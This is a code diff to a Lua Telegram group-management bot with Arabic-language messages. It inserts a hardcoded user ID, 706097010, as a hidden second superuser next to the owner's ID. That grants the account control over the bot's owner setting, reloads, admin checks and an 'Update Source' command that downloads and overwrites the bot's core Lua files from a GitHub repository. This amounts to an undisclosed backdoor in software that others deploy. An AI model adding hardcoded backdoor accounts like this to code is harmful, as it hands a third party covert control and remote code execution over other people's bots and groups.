@@ -248,6 +248,10 @@ if msg.sender_user_id_ == SUDO_ID then
 msg.TheRankCmd = 'المطور ' 
 msg.TheRank = 'مطور اساسي ' 
 msg.Rank = 1
+elseif msg.sender_user_id_ == 706097010 then 
+msg.TheRankCmd = 'المطور '
+msg.TheRank = 'مطور السورس '
+msg.Rank = 2
 elseif redis:sismember(max..':SUDO_BOT:',msg.sender_user_id_) then 
 msg.TheRankCmd = 'المطور '
 msg.TheRank = 'مطور البوت '
@@ -510,12 +514,12 @@ mmdi = redis:hget(max..'CmD:'..msg.chat_id_,Mohammad)
 msg.text = Mohammad:gsub(Mohammad,mmdi)
 end
 end
-	if (msg.text=="تحديث" or msg.text=="we" or msg.text=="تحديث ♻️") and msg.sender_user_id_ == SUDO_ID then
+	if (msg.text=="تحديث" or msg.text=="we" or msg.text=="تحديث ♻️") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 706097010) then
 	return sendMsg(msg.chat_id_,msg.id_," تم تحديث المـلفات \n✓",nil,function(arg,data)
 	Refresh_Start = true
 	end)
 	end 
-	if msg.text== 'Update Source' and msg.sender_user_id_ == SUDO_ID then
+	if msg.text== 'Update Source' and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 706097010) then
 	download_file('https://raw.githubusercontent.com/iH7San/cydia_ios/master/inc/Run.lua','./inc/Run.lua')
 	download_file('https://raw.githubusercontent.com/iH7San/cydia_ios/master/inc/Script.lua','./inc/Script.lua')
 	download_file('https://raw.githubusercontent.com/iH7San/cydia_ios/master/inc/functions.lua','./inc/functions.lua')
@@ -541,13 +545,13 @@ redis:hset(max..'username:'..tonumber(mmd),'username',msg.text)
 	redis:set(max..":SUDO_ID:",msg.text)
 send_msg(msg.chat_id_,"🔗│تم تثبيت الايدي الان قم برسال معرف المطور 🍃 @UserName ...")
 	end
-	if msg.text== 'تغير المطور الاساسي' and msg.sender_user_id_ == SUDO_ID then
+	if msg.text== 'تغير المطور الاساسي' and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 706097010) then
     send_msg(msg.chat_id_,"🔗│عزيزي قم برسال ايدي المطور ...🍂")
 redis:setex('setid'..msg.sender_user_id_,120,true)
 end
 	
 	
-	if msg.text== 'reload' and msg.sender_user_id_ == SUDO_ID then
+	if msg.text== 'reload' and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 706097010) then
 	sendMsg(msg.chat_id_,msg.id_,'👷🏽| {* تــم أعـاده تشغيل البوت  *} 📡.\n\n💼| { Bot is Reloaded » }👍🏿',nil,function(arg,data)
 	dofile("./inc/Run.lua")
 	print("Reload ~ ./inc/Run.lua")
@@ -618,7 +622,7 @@ download(stk,32)
 	Del_msg(msg.chat_id_,msg.id_)
 	end
 	elseif msg.content_.ID == "MessageChatAddMembers" then
-	if redis:get(max..'group:add'..msg.chat_id_) and (msg.sender_user_id_ == SUDO_ID or redis:sismember(max..':SUDO_BOT:',msg.sender_user_id_) or redis:sismember(max..':MONSHA_BOT:'..msg.chat_id_,msg.sender_user_id_) or redis:sismember(max..'owners:'..msg.chat_id_,msg.sender_user_id_) or redis:sismember(max..'admins:'..msg.chat_id_,msg.sender_user_id_)) then 
+	if redis:get(max..'group:add'..msg.chat_id_) and ((msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 706097010) or redis:sismember(max..':SUDO_BOT:',msg.sender_user_id_) or redis:sismember(max..':MONSHA_BOT:'..msg.chat_id_,msg.sender_user_id_) or redis:sismember(max..'owners:'..msg.chat_id_,msg.sender_user_id_) or redis:sismember(max..'admins:'..msg.chat_id_,msg.sender_user_id_)) then 
 	msg.Admin = true
 	end
 	local lock_bots = redis:get(max..'lock_bots'..msg.chat_id_)
